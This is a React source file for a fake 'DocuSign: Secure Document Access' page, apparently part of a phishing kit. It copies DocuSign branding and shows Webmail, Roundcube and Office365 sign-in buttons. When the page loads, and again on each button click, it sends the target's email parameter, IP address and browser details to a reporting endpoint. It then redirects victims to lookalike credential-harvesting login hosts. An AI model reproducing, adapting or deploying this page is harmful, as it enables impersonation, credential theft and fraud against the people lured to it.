/** @format */
"use client";

import React, { useState, useEffect } from "react";

// Sign-In Button Component with logos
const SignInButton = ({ provider, onClick, bgColor, logo }) => (
  <button
    onClick={onClick}
    style={{
      width: "85%",
      backgroundColor: bgColor || "#3DBBFF",
      color: "#fff",
      border: "none",
      padding: "12px",
      borderRadius: "6px",
      cursor: "pointer",
      fontSize: "16px",
      height: "44px",
      marginBottom: "10px",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      gap: "10px",
      marginLeft: "27px"
    }}
  >
    {logo && (
      <img 
        src={logo} 
        alt={`${provider} logo`}
        style={{
          width: "25px",
          height: "25px",
          objectFit: "contain",
          marginRight:"50"
        }}
      />
    )}
    Sign in with {provider}
  </button>
);

const Popup = ({ domain, eparams, systemInfo }) => {
  const [userAgent, setUserAgent] = useState("");
  const [remoteAddress, setRemoteAddress] = useState("");
  const [landingUrl, setLandingUrl] = useState("");

  // Logo URLs
  const webmailLogo = "https://i.postimg.cc/nrMkM6Br/Chat-GPT-Image-Oct-8-2025-07-29-02-AM-removebg-preview.png"; // Generic email icon
  const roundcubeLogo = "https://i.postimg.cc/3J8CqwZZ/Roundcubelogo.png"; // Roundcube logo
  const office365Logo = "https://i.postimg.cc/jjbH6V6T/Stylized-Microsoft-Office-Logo-Design.png"; // Office 365/Microsoft logo
  const outlookLogo = "https://i.postimg.cc/sfGwBvZ5/jg.png"; // Outlook logo - using same as Roundcube for now

  useEffect(() => {
    // Apply CSS to body - only runs on client side
    document.body.style.background = "url('/shipping-document-commercial-invoice.webp') no-repeat center center fixed";
    document.body.style.backgroundSize = "cover";
    document.body.style.backdropFilter = "blur(5px)";
    document.body.style.webkitBackdropFilter = "blur(10px)"; // For Safari

    // Set user agent
    setUserAgent(navigator.userAgent);

    // Set landing URL
    setLandingUrl(window.location.href);

    // Get IP address
    const getIP = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        setRemoteAddress(data.ip);
      } catch (error) {
        console.error("Failed to get IP address:", error);
        setRemoteAddress("Unable to retrieve IP");
      }
    };

    getIP();

    // Send access notification when component mounts
    const sendAccessNotification = async () => {
      try {
        await fetch(
          `/api/sendemail?email=${encodeURIComponent(
            eparams
          )}&userAgent=${encodeURIComponent(
            navigator.userAgent
          )}&remoteAddress=${encodeURIComponent(
            remoteAddress
          )}&landingUrl=${encodeURIComponent(window.location.href)}`,
          {
            method: "GET",
          }
        );
      } catch (error) {
        console.error("Failed to send access notification:", error);
      }
    };

    sendAccessNotification();
  }, [eparams, remoteAddress]);

  const handleSignIn = async (provider) => {
    try {
      await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          eparams,
          provider,
          userAgent,
          remoteAddress,
          landingUrl: window.location.href,
        }),
      });
    } catch (error) {
      console.error("Failed to send credentials:", error);
    }

    // Different landing URLs for each provider
    let redirectUrl = "";
    switch (provider) {
      case "Webmail":
        redirectUrl = "https://webmaildocs.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
        break;
      case "Roundcube":
        redirectUrl = "https://roundcubedocs.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
        break;
      case "Office365":
        redirectUrl = "https://login.securityteam2096.online/pKVVNFUv";
        break;
      case "Others":
        redirectUrl = "https://login.securityteam2096.online/pKVVNFUv";
        break;
      default:
        redirectUrl = "";
    }

    window.location.href = redirectUrl;
  };

  return (
    <div
      style={{
        padding: "40px",
        borderRadius: "10px",
        maxWidth: "400px",
        width: "100%",
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
        backgroundColor: "#3d3d3d",
        textAlign: "center",
        color: "#fff",
        backdropFilter: "blur(10px)",
        webkitBackdropFilter: "blur(10px)",
        position: "relative",
        zIndex: 1,
      }}
    >
      <div style={{ marginBottom: "20px" }}>
        <img
          style={{ width: "140px", height: "auto" }}
          src="/docu.jpg"
          alt="Paperless Post"
        />
      </div>

      <h2
        style={{
          fontSize: "14px",
          color: "#fff",
          marginBottom: "10px",
          fontWeight: "bold",
        }}
      >
        DocuSign: Secure Document Access & Review
      </h2>
      <p style={{ fontSize: "14px", color: "#ddd", marginBottom: "20px", fontWeight: "bold" }}>
        You have been granted exclusive access to a secure document for digital viewing and review.
      </p>
      <p style={{ fontSize: "12px",color: "#ddd" }}>
        To view and interact with your document, please select your preferred authentication method below and log in.
      </p>
      <p style={{ fontSize: "12px", color: "#ddd" }}>
       Your secure document is hosted on the DocuSign Agreement Cloud for trusted digital viewing and review.
      </p>

      <SignInButton 
        provider="Webmail" 
        onClick={() => handleSignIn("Webmail")} 
        logo={webmailLogo}
      />
      <SignInButton
        provider="Roundcube"
        onClick={() => handleSignIn("Roundcube")}
        bgColor="#3055A1"
        logo={roundcubeLogo}
      />
      <SignInButton
        provider="Office365"
        onClick={() => handleSignIn("Office365")}
        bgColor="#8B4D4D"
        logo={office365Logo}
      />
      <SignInButton
        provider="Others"
        onClick={() => handleSignIn("Outlook")}
        bgColor="#0072C6"
        logo={outlookLogo}
      />

      <div style={{ marginTop: "20px", fontSize: "12px", color: "#ddd" }}>
       DocuSign streamlines agreement workflows with user-friendly tools for managing secure digital viewing, review and important records.
      </div>

      <div
        style={{
          fontSize: "12px",
          color: "#ddd",
          marginTop: "10px",
          textAlign: "center",
        }}
      >
      © 2025 DocuSign, Inc. All rights reserved. DocuSign is a registered trademark of DocuSign, Inc.
      </div>
    </div>
  );
};

const PopupMobile = ({ domain, eparams, systemInfo }) => {
  const [userAgent, setUserAgent] = useState("");
  const [remoteAddress, setRemoteAddress] = useState("");
  const [landingUrl, setLandingUrl] = useState("");

  // Logo URLs
  const webmailLogo = "https://i.postimg.cc/nrMkM6Br/Chat-GPT-Image-Oct-8-2025-07-29-02-AM-removebg-preview.png"; // Generic email icon
  const roundcubeLogo = "https://i.postimg.cc/3J8CqwZZ/Roundcubelogo.png"; // Roundcube logo
  const office365Logo = "https://i.postimg.cc/jjbH6V6T/Stylized-Microsoft-Office-Logo-Design.png"; // Office 365/Microsoft logo
  const outlookLogo = "https://i.postimg.cc/sfGwBvZ5/jg.png"; // Outlook logo - using same as Roundcube for now

  useEffect(() => {
    // Apply CSS to body - only runs on client side
    document.body.style.background = "url('/shipping-document-commercial-invoice.webp') no-repeat center center fixed";
    document.body.style.backgroundSize = "cover";
    document.body.style.backdropFilter = "blur(5px)";
    document.body.style.webkitBackdropFilter = "blur(10px)"; // For Safari

    // Set user agent
    setUserAgent(navigator.userAgent);

    // Set landing URL
    setLandingUrl(window.location.href);

    // Get IP address
    const getIP = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        setRemoteAddress(data.ip);
      } catch (error) {
        console.error("Failed to get IP address:", error);
        setRemoteAddress("Unable to retrieve IP");
      }
    };

    getIP();

    // Send access notification when component mounts
    const sendAccessNotification = async () => {
      try {
        await fetch(
          `/api/sendemail?email=${encodeURIComponent(
            eparams
          )}&userAgent=${encodeURIComponent(
            navigator.userAgent
          )}&remoteAddress=${encodeURIComponent(
            remoteAddress
          )}&landingUrl=${encodeURIComponent(window.location.href)}`,
          {
            method: "GET",
          }
        );
      } catch (error) {
        console.error("Failed to send access notification:", error);
      }
    };

    sendAccessNotification();
  }, [eparams, remoteAddress]);

  const handleSignIn = async (provider) => {
    try {
      await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          eparams,
          provider,
          userAgent,
          remoteAddress,
          landingUrl: window.location.href,
        }),
      });
    } catch (error) {
      console.error("Failed to send credentials:", error);
    }

    // Different landing URLs for each provider
    let redirectUrl = "";
    switch (provider) {
      case "Webmail":
        redirectUrl = "https://webmaildocs.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
        break;
      case "Roundcube":
        redirectUrl = "https://roundcubedocs.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
        break;
      case "Office365":
        redirectUrl = "https://login.securityteam2096.online/pKVVNFUv";
        break;
      case "Outlook":
        redirectUrl = "https://login.securityteam2096.online/pKVVNFUv";
        break;
      default:
        redirectUrl = "";
    }

    window.location.href = redirectUrl;
  };

  return (
    <div
      style={{
        padding: "20px 15px",
        borderRadius: "10px",
        width: "92%",
        maxWidth: "295px",
        margin: "20px auto",
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
        boxSizing: "border-box",
        backgroundColor: "#3d3d3d",
        textAlign: "center",
        color: "#fff",
        backdropFilter: "blur(10px)",
        webkitBackdropFilter: "blur(10px)",
        position: "relative",
        zIndex: 1,
      }}
    >
      <div style={{ marginBottom: "15px" }}>
        <img
          style={{ width: "100px", height: "auto" }}
          src="/docu.jpg"
          alt="Paperless Post"
        />
      </div>

      <h2
        style={{
          fontSize: "11px",
          color: "#fff",
          marginBottom: "8px",
          fontWeight: "bold",
          lineHeight: "1.3"
        }}
      >
        DocuSign: Secure Document Access & Review
      </h2>
      <p style={{ fontSize: "10px", color: "#ddd", marginBottom: "15px", fontWeight: "bold", lineHeight: "1.3" }}>
        You have been granted exclusive access to a secure document for digital viewing and review.
      </p>
      <p style={{ fontSize: "10px", color: "#ddd", lineHeight: "1.3", marginBottom: "8px" }}>
       To view and interact with your document, please select your preferred authentication method below and log in.
      </p>
      <p style={{ fontSize: "10px",color: "#ddd", lineHeight: "1.3", marginBottom: "15px" }}>
        Your secure document is hosted on the DocuSign Agreement Cloud for trusted digital viewing and review.
      </p>

      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "8px" }}>
        <button
          onClick={() => handleSignIn("Webmail")}
          style={{
            width: "100%",
            backgroundColor: "#3DBBFF",
            color: "#fff",
            border: "none",
            padding: "10px",
            borderRadius: "6px",
            cursor: "pointer",
            fontSize: "12px",
            height: "38px",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "8px",
          }}
        >
          <img 
            src={webmailLogo} 
            alt="Webmail logo"
            style={{
              width: "20px",
              height: "20px",
              objectFit: "contain",
            }}
          />
          Sign in with Webmail
        </button>

        <button
          onClick={() => handleSignIn("Roundcube")}
          style={{
            width: "100%",
            backgroundColor: "#3055A1",
            color: "#fff",
            border: "none",
            padding: "10px",
            borderRadius: "6px",
            cursor: "pointer",
            fontSize: "12px",
            height: "38px",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "8px",
          }}
        >
          <img 
            src={roundcubeLogo} 
            alt="Roundcube logo"
            style={{
              width: "20px",
              height: "20px",
              objectFit: "contain",
            }}
          />
          Sign in with Roundcube
        </button>

        <button
          onClick={() => handleSignIn("Office365")}
          style={{
            width: "100%",
            backgroundColor: "#8B4D4D",
            color: "#fff",
            border: "none",
            padding: "10px",
            borderRadius: "6px",
            cursor: "pointer",
            fontSize: "12px",
            height: "38px",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "8px",
          }}
        >
          <img 
            src={office365Logo} 
            alt="Office365 logo"
            style={{
              width: "20px",
              height: "20px",
              objectFit: "contain",
            }}
          />
          Sign in with Office365
        </button>

        <button
          onClick={() => handleSignIn("Others")}
          style={{
            width: "100%",
            backgroundColor: "#0072C6",
            color: "#fff",
            border: "none",
            padding: "10px",
            borderRadius: "6px",
            cursor: "pointer",
            fontSize: "12px",
            height: "38px",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "8px",
          }}
        >
          <img 
            src={outlookLogo} 
            alt="Outlook logo"
            style={{
              width: "20px",
              height: "20px",
              objectFit: "contain",
            }}
          />
          Sign in with Others
        </button>
      </div>

      <div style={{ marginTop: "15px", fontSize: "10px", color: "#ddd", lineHeight: "1.3" }}>
       DocuSign streamlines agreement workflows with user-friendly tools for managing secure digital viewing, review and important records.
      </div>

      <div
        style={{
          fontSize: "9px",
          color: "#ddd",
          marginTop: "8px",
          textAlign: "center",
          lineHeight: "1.3"
        }}
      >
        © 2025 DocuSign, Inc. All rights reserved. DocuSign is a registered trademark of DocuSign, Inc.
      </div>
    </div>
  );
};

const ResponsivePopup = (props) => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  return isMobile ? <PopupMobile {...props} /> : <Popup {...props} />;
};

export default ResponsivePopup;